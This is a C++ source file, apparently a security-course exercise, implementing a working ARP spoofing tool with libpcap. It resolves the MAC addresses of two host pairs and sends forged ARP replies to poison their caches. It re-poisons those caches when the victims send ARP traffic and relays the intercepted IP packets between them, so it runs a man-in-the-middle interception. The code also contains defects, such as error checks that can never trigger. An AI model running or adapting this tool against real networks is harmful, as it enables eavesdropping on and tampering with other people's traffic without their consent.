#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <libnet.h>
#include <stdlib.h>
#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};

#pragma pack(pop)
#pragma pack(push, 1)
struct EthIpPacket {
    EthHdr eth_;
    IpHdr ip_;

};
#pragma pack(pop)


void usage() {
    printf("syntax: arp-spoofing <interface> <sender ip> <target ip> <sender ip2> <target ip2>\n");
    printf("sample: arp-spoofing wlan0 192.168.1.2 192.168.1.1 [192.168.1.1 192.168.1.2 ....]\n");
}


int main(int argc, char* argv[]) {
    if (argc!=6) {
		usage();
		return -1;
	}
    Ip strip;
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
	}

    const u_char *repacket;
    const u_char *repacket2;
    const u_char *repacket3;
    const u_char *repacket4;

    //getmymac socket
    struct ifreq ifr;
    int s;
   Mac mymac;

   // unsigned char macaddr[10];
    s= socket(AF_INET, SOCK_DGRAM,0);
    strncpy(ifr.ifr_name,argv[1],IFNAMSIZ);

    if(ioctl(s,SIOCGIFHWADDR,&ifr)<0){
        printf("error\n");
        return -1;
    }
    else
    {
        memcpy(&mymac,ifr.ifr_hwaddr.sa_data,6);
    }

    //getmyip SOCKET
    struct ifreq ifrip;
    int d;

    d= socket(AF_INET, SOCK_DGRAM,0);
    strncpy(ifrip.ifr_name,argv[1],IFNAMSIZ);
    if(ioctl(d,SIOCGIFADDR,&ifrip)<0){
        printf("error\n");
        return -1;
    }
   else {
      memcpy(&strip,ifrip.ifr_addr.sa_data+2,4);
      printf("strip : %02x\n",ntohl(strip));
    }


    //

    // get macpacket  etherppacket request
    EthArpPacket packetreq;
    packetreq.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");// modified dmac
    packetreq.eth_.smac_ = mymac;
    packetreq.eth_.type_ = htons(EthHdr::Arp);

    packetreq.arp_.hrd_ = htons(ArpHdr::ETHER);
    packetreq.arp_.pro_ = htons(EthHdr::Ip4);
    packetreq.arp_.hln_ = Mac::SIZE;
    packetreq.arp_.pln_ = Ip::SIZE;
    packetreq.arp_.op_ = htons(ArpHdr::Request);
    packetreq.arp_.smac_ = mymac;
    packetreq.arp_.sip_ = (Ip(strip));
    packetreq.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packetreq.arp_.tip_ = htonl(Ip(argv[2]));
    int pres = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packetreq),sizeof(EthArpPacket));

    if(pres!=0){
        fprintf(stderr,"pcap_sendpacket error %s",pcap_geterr(handle));
    }
    // get tmacdr 192.168.1.168
    pres=0;
    Mac tmacdr;


    while(1)
    {
        EthArpPacket *pp;
        struct pcap_pkthdr *header;
        pres=pcap_next_ex(handle,&header,&repacket);
        if(pres==0) continue;
        if(pres==-1&&pres==-2)
        {
            break;
        }

        pp=(struct EthArpPacket *)(repacket);

        if(ntohs(pp->arp_.op_)==ArpHdr::Reply &&htonl(Ip(argv[2]))==pp->arp_.sip_)
        {
            memcpy(&tmacdr,pp->arp_.smac_,6);
            break;
        }
    }

// macpacket2
    EthArpPacket packetmac2;
    packetmac2.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");// modified dmac
    packetmac2.eth_.smac_ = mymac;
    packetmac2.eth_.type_ = htons(EthHdr::Arp);

    packetmac2.arp_.hrd_ = htons(ArpHdr::ETHER);
    packetmac2.arp_.pro_ = htons(EthHdr::Ip4);
    packetmac2.arp_.hln_ = Mac::SIZE;
    packetmac2.arp_.pln_ = Ip::SIZE;
    packetmac2.arp_.op_ = htons(ArpHdr::Request);
    packetmac2.arp_.smac_ = mymac;
    packetmac2.arp_.sip_ = Ip(strip);
    packetmac2.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packetmac2.arp_.tip_ = htonl(Ip(argv[3]));


    int ores = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packetmac2),sizeof(EthArpPacket));

    if(ores!=0)
    {
        fprintf(stderr,"pcap_sendpacket error %s",pcap_geterr(handle));
    }

    // get tmacdr2 192.168.1.1
    ores=0;
    Mac tmacdr2;


    while(1)
    {
        EthArpPacket *pp;
        struct pcap_pkthdr *header;
        ores=pcap_next_ex(handle,&header,&repacket2);
        if(ores==0) continue;
        if(ores==-1&&ores==-2)
        {
            break;
        }

        pp=(struct EthArpPacket *)(repacket2);

        if(ntohs(pp->arp_.op_)==ArpHdr::Reply &&htonl(Ip(argv[3]))==pp->arp_.sip_)
        {
            memcpy(&tmacdr2,pp->arp_.smac_,6);
            break;
        }
    }

    // macpacket3
    EthArpPacket packetreq3;
    packetreq3.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");// modified dmac
    packetreq3.eth_.smac_ = mymac;
    packetreq3.eth_.type_ = htons(EthHdr::Arp);

    packetreq3.arp_.hrd_ = htons(ArpHdr::ETHER);
    packetreq3.arp_.pro_ = htons(EthHdr::Ip4);
    packetreq3.arp_.hln_ = Mac::SIZE;
    packetreq3.arp_.pln_ = Ip::SIZE;
    packetreq3.arp_.op_ = htons(ArpHdr::Request);
    packetreq3.arp_.smac_ = mymac;
    packetreq3.arp_.sip_ = (Ip(strip));
    packetreq3.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packetreq3.arp_.tip_ = htonl(Ip(argv[4]));
    int cres = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packetreq3),sizeof(EthArpPacket));

    if(cres!=0){
        fprintf(stderr,"pcap_sendpacket error %s",pcap_geterr(handle));
    }
    // get tmacdr 192.168.1.168

    //get tmacdr3
    Mac tmacdr3;


    while(1)
    {
        EthArpPacket *pp;
        struct pcap_pkthdr *header;
        cres=pcap_next_ex(handle,&header,&repacket3);
        if(cres==0) continue;
        if(cres==-1&&cres==-2)
        {
            break;
        }

        pp=(struct EthArpPacket *)(repacket3);

        if(ntohs(pp->arp_.op_)==ArpHdr::Reply &&htonl(Ip(argv[4]))==pp->arp_.sip_)
        {
            memcpy(&tmacdr3,pp->arp_.smac_,6);
            break;
        }
    }

    // macpacket4
    EthArpPacket packetreq4;
    packetreq4.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");// modified dmac
    packetreq4.eth_.smac_ = mymac;
    packetreq4.eth_.type_ = htons(EthHdr::Arp);

    packetreq4.arp_.hrd_ = htons(ArpHdr::ETHER);
    packetreq4.arp_.pro_ = htons(EthHdr::Ip4);
    packetreq4.arp_.hln_ = Mac::SIZE;
    packetreq4.arp_.pln_ = Ip::SIZE;
    packetreq4.arp_.op_ = htons(ArpHdr::Request);
    packetreq4.arp_.smac_ = mymac;
    packetreq4.arp_.sip_ = (Ip(strip));
    packetreq4.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packetreq4.arp_.tip_ = htonl(Ip(argv[5]));
    int dres = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packetreq4),sizeof(EthArpPacket));

    if(dres!=0){
        fprintf(stderr,"pcap_sendpacket error %s",pcap_geterr(handle));
    }
    // get tmacdr 192.168.1.168

    //get tmacdr3
    Mac tmacdr4;


    while(1)
    {
        EthArpPacket *pp;
        struct pcap_pkthdr *header;
        dres=pcap_next_ex(handle,&header,&repacket4);
        if(dres==0) continue;
        if(dres==-1&&dres==-2)
        {
            break;
        }

        pp=(struct EthArpPacket *)(repacket4);

        if(ntohs(pp->arp_.op_)==ArpHdr::Reply &&htonl(Ip(argv[5]))==pp->arp_.sip_)
        {
            memcpy(&tmacdr4,pp->arp_.smac_,6);
            break;
        }
    }



    //infect sender2
    EthArpPacket packet2;
    packet2.eth_.dmac_ = tmacdr3;// modified dmac
    packet2.eth_.smac_ = mymac;
    packet2.eth_.type_ = htons(EthHdr::Arp);

    packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet2.arp_.pro_ = htons(EthHdr::Ip4);
    packet2.arp_.hln_ = Mac::SIZE;
    packet2.arp_.pln_ = Ip::SIZE;
    packet2.arp_.op_ = htons(ArpHdr::Reply);
    packet2.arp_.smac_ = mymac;
    packet2.arp_.sip_ = htonl(Ip(argv[5]));
    packet2.arp_.tmac_ = tmacdr2;
    packet2.arp_.tip_ = htonl(Ip(argv[4]));
    int res2= pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));

    if (res2 != 0)
    {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
    }
    printf("send infect\n");

    // infect sender1

    EthArpPacket packet;
    packet.eth_.dmac_ = tmacdr;// modified dmac
    packet.eth_.smac_ = mymac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = mymac;
    packet.arp_.sip_ = htonl(Ip(argv[3]));
    packet.arp_.tmac_ = tmacdr;
    packet.arp_.tip_ = htonl(Ip(argv[2]));
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }


    const u_char *relaypacket;
    EthHdr * relayether;

    struct pcap_pkthdr *header;
    EthIpPacket *ipP;
    EthArpPacket *arpP;
    int payl;

    while(1)
    {

        pres=pcap_next_ex(handle,&header,&relaypacket);
        if(pres==0) continue;
        if(pres==-1&&pres==-2)
        {
            break;
        }


            relayether = (struct EthHdr *)(relaypacket);
            ipP=(struct EthIpPacket *)(relaypacket);

            printf("%0x:%0x\n",ipP->ip_.ip_src,ntohl(Ip(argv[2])));

            if(relayether->type_==htons(EthHdr::Ip4))
            {
                ipP=(struct EthIpPacket *)(relaypacket);


                if(ipP->eth_.dmac_==mymac&&ipP->ip_.ip_src==htonl(Ip(argv[2])))
                {

                    payl=header->caplen;
                    uint8_t *data=new uint8_t[payl];
                    data=(uint8_t *)(relaypacket);
                                                    //modified delete
                    memcpy((data+6),mymac,6);
                    memcpy((data),tmacdr2,6);
                    printf("-------------relay sender 1 -\n");
                    int jres = pcap_sendpacket(handle, data, payl);
                    if (jres != 0)
                    {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", jres, pcap_geterr(handle));
                    }
                }
                else if(ipP->eth_.dmac_==mymac&&ipP->ip_.ip_dst==htonl(Ip(argv[5])))
                {
                     payl=header->caplen;
                    uint8_t *data=new uint8_t[payl];
                    data=(uint8_t *)(relaypacket);
                    memcpy((data+6),mymac,6);
                    memcpy((data),tmacdr4,6);
                    printf("-----------------relay sender2 --------------------\n");

                    int rres = pcap_sendpacket(handle, data, payl);
                    if (rres != 0) {
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", rres, pcap_geterr(handle));
                    }
                }


            }
            else if(relayether->type_==htons(EthHdr::Arp))
            {
                arpP=(struct EthArpPacket *)(relaypacket);
                if(arpP->eth_.smac_==tmacdr&&arpP->arp_.tip_==Ip(argv[3]))
                {

                      printf(" send-arp packet\n");
                      int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                      if (res != 0)
                      {
                          fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                      }
                }
                else if(arpP->eth_.smac_==tmacdr3)
                {
                     printf(" send-arp packet2-------------------------------- 2\n");
                     int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet2), sizeof(EthArpPacket));
                     if (res != 0)
                     {
                         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                     }
                     printf(" send-arp packet\n");
                     int tres = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
                     if (tres != 0)
                     {
                         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                     }
               }
            }



    }
    pcap_close(handle);
}
